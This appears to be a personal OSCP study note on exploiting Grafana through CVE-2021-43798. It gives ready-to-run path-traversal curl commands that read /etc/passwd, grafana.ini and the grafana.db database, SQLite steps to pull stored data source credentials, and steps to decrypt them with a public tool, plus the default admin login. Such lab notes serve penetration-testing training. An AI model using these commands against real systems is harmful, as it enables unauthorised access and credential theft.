Default admin password
```admin
admin
```

v9.3.0

```Powershell
Grafana requires 

1. Secretkey
2. DB data source password
```

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `curl --path-as-is http://${ip}:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`;

dv.paragraph("```bash\n" + command + "\n```");
```
/etc/grafana/grafana.ini should contain the Secret key we need

Ctrl + Shift + F secret_key
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `curl --path-as-is http://${ip}:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

## Obtain DB Data source password

Grafana dabatase .db
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `curl --path-as-is http://${ip}:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db`;

dv.paragraph("```bash\n" + command + "\n```");
```

Open .db
```
sqlite grafana.db
```

```
.tables
```

```
select * from data_source;
```

---

Now we have both passwords,

https://github.com/jas502n/Grafana-CVE-2021-43798

```
git clone https://github.com/jas502n/Grafana-CVE-2021-43798 && - cd Grafana-CVE-2021-43798
```

```
go mod init grafana
```

```
go get golang.org/x/crypto/pbkdf2
```

```
go run AESDecrypt.go
```

edit the AESDecrypt and replace your own values
```
gedit AESDecrypt.go
```
